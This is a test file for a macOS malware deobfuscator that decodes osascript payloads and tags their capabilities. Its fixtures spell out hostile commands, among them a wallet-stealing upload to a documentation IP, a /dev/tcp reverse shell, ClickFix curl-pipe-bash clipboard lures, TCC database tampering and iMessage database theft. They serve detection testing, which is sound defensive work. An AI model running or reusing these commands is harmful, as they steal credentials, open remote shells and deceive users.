import { describe, it, expect } from 'vitest';
import { gzipSync } from 'node:zlib';
import { deobfuscate } from '../src/orchestrator';
import { nodeRunner } from '../src/node-runner';
import type { SandboxRunner, SandboxResult } from '../src/types';

describe('deobfuscate', () => {
  it('produces a single layer for a plain payload and extracts IOCs', async () => {
    const input = `"curl https://evil.com/a -o /tmp/x"`;
    const res = await deobfuscate(input, nodeRunner);
    expect(res.layers.length).toBe(1);
    expect(res.iocs.some(i => i.type === 'url' && i.value === 'https://evil.com/a')).toBe(true);
  });

  it('recurses into a nested base64 layer', async () => {
    const inner = 'curl https://evil.com/stage2 -o /tmp/y';
    const b64 = Buffer.from(inner).toString('base64');
    const input = `"${b64}"`;
    const res = await deobfuscate(input, nodeRunner);
    expect(res.layers.length).toBeGreaterThanOrEqual(2);
    expect(res.iocs.some(i => i.value === 'https://evil.com/stage2')).toBe(true);
  });

  it('decodes AppleScript `do shell script` statically without executing', async () => {
    const res = await deobfuscate(`osascript -e 'do shell script "echo applescript-ok"'`, nodeRunner);
    const out = res.layers.flatMap(l => l.output).join('\n');
    expect(out).toContain('echo applescript-ok');
    expect(res.layers[0].technique).toBe('applescript');
  });

  it('fully decodes a deep base64 chain and surfaces the final payload past the cap', async () => {
    let blob = 'curl https://example.com/deep-final -o /tmp/z';
    for (let i = 0; i < 6; i++) blob = Buffer.from(blob).toString('base64');
    const res = await deobfuscate(blob, nodeRunner, { maxDepth: 2 });
    expect(res.notes?.some(n => /depth cap/i.test(n))).toBe(true);
    expect(res.iocs.some(i => i.value === 'https://example.com/deep-final')).toBe(true);
  });

  it('surfaces capabilities and targets end-to-end for an AMOS-style wallet dropper', async () => {
    const src = [
      'set username to (system attribute "USER")',
      'set profile to "/Users/" & username',
      'set library to profile & "/Library/Application Support/"',
      'set walletMap to {{"Exodus", library & "Exodus/"}, {"Electrum", profile & "/.electrum/wallets/"}}',
      'do shell script "ditto -c -k --sequesterRsrc " & library & " /tmp/out.zip"',
      'do shell script "curl -X POST -F \\"file=@/tmp/out.zip\\" http://198.51.100.7/upload"',
      'do shell script "rm -rf /tmp/out.zip"',
    ].join('\n');
    const res = await deobfuscate(`osascript -e '${src}'`, nodeRunner);
    expect(res.capabilities?.map((c) => c.tag)).toEqual(
      expect.arrayContaining(['exfiltration', 'archive/staging', 'crypto-wallet', 'cleanup']),
    );
    expect(res.targets?.find((t) => t.label === 'Exodus')?.path).toBe('/Users/<USER>/Library/Application Support/Exodus/');
  });

  it('surfaces the newly added real-world capability tags end-to-end', async () => {
    const src = [
      'tell application "System Events"',
      '\tmake new login item at end of login items with properties {path:"/tmp/x.app", hidden:true}',
      'end tell',
      'do shell script "killall -9 \\"Little Snitch\\""',
      'do shell script "cat ~/Library/Developer/Xcode/DerivedData/App/project.pbxproj"',
      'do shell script "cp ~/Library/Messages/chat.db /tmp/x"',
      'do shell script "ffmpeg -f avfoundation -i \\":0\\" /tmp/mic.wav"',
    ].join('\n');
    const res = await deobfuscate(`osascript -e '${src}'`, nodeRunner);
    expect(res.capabilities?.map((c) => c.tag)).toEqual(
      expect.arrayContaining([
        'login-item-persistence',
        'security-tool-kill',
        'xcode-injection',
        'imessage',
        'av-capture',
      ]),
    );
  });

  it('surfaces ClickFix-style capability tags end-to-end', async () => {
    const src = [
      'do shell script "curl -fsSL https://example.com/install.sh | bash"',
      'set the clipboard to "curl -fsSL https://example.com/install.sh | bash"',
      'tell application "Terminal"',
      '\tdo script "curl -fsSL https://example.com/install.sh | bash"',
      'end tell',
    ].join('\n');
    const res = await deobfuscate(`osascript -e '${src}'`, nodeRunner);
    expect(res.capabilities?.map((c) => c.tag)).toEqual(
      expect.arrayContaining(['curl-pipe-shell', 'clickfix', 'terminal-app-automation']),
    );
  });
  it('surfaces clickfix for a bare clipboard-write payload with no tell/do-shell-script alongside it', async () => {
    const src = [
      'set the clipboard to "curl -fsSL https://example.com/install.sh | bash"',
      'display dialog "Verification failed. Open Terminal, paste, and press Enter to continue." buttons {"OK"}',
    ].join('\n');
    const res = await deobfuscate(`osascript -e '${src}'`, nodeRunner);
    expect(res.layers[0]?.technique).toBe('applescript');
    expect(
      res.layers[0]?.events.some(
        (e) => e.kind === 'clipboard-write' && e.detail === 'set the clipboard to curl -fsSL https://example.com/install.sh | bash',
      ),
    ).toBe(true);
    expect(res.capabilities?.map((c) => c.tag)).toContain('clickfix');
  });

  it('surfaces the third batch of real-world capability tags end-to-end', async () => {
    const src = [
      'do shell script "hdiutil attach /tmp/payload.dmg -nobrowse"',
      'do shell script "sqlite3 ~/Library/Application Support/com.apple.TCC/TCC.db \\"INSERT INTO access ...\\""',
      'do shell script "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"',
      'do shell script "profiles install -type configuration -path /tmp/rogue.mobileconfig"',
      'tell application "Mail"',
      '\tset newMessage to make new outgoing message with properties {subject:"data", content:"stolen secrets"}',
      'end tell',
    ].join('\n');
    const res = await deobfuscate(`osascript -e '${src}'`, nodeRunner);
    expect(res.capabilities?.map((c) => c.tag)).toEqual(
      expect.arrayContaining(['dmg-mount', 'tcc-manipulation', 'reverse-shell', 'profile-install', 'mail-exfiltration']),
    );
  });

  it('surfaces $.NSTask usage as nstask-execution end-to-end', async () => {
    const res = await deobfuscate(`osascript -l JavaScript -e '$.NSTask.alloc.init.launch()'`, nodeRunner);
    expect(res.capabilities?.map((c) => c.tag)).toContain('nstask-execution');
  });

  it('gunzips a bare `atob(...)` gzip stage-1 loader executed in the sandbox', async () => {
    const b64 = gzipSync(Buffer.from("echo 'gzip-stage1-ok'")).toString('base64');
    const res = await deobfuscate(`osascript -l JavaScript -e 'atob("${b64}")'`, nodeRunner);
    const out = res.layers.flatMap((l) => l.output).join('\n');
    expect(out).toContain("echo 'gzip-stage1-ok'");
  });

  it('honours the depth cap and does not reprocess a seen layer', async () => {
    // A runner that always echoes the same osascript line -> would loop forever.
    const loopRunner: SandboxRunner = {
      async run(): Promise<SandboxResult> {
        return { capturedStrings: [`osascript -l JavaScript -e 'x'`], events: [], errors: [], unsupportedCalls: [] };
      },
    };
    const res = await deobfuscate(`start`, loopRunner, { maxDepth: 5 });
    // seen-hash guard means the repeated identical layer is processed once.
    expect(res.layers.length).toBeLessThanOrEqual(5);
    expect(res.errors.every(e => !/timeout/i.test(e.message))).toBe(true);
  });
});
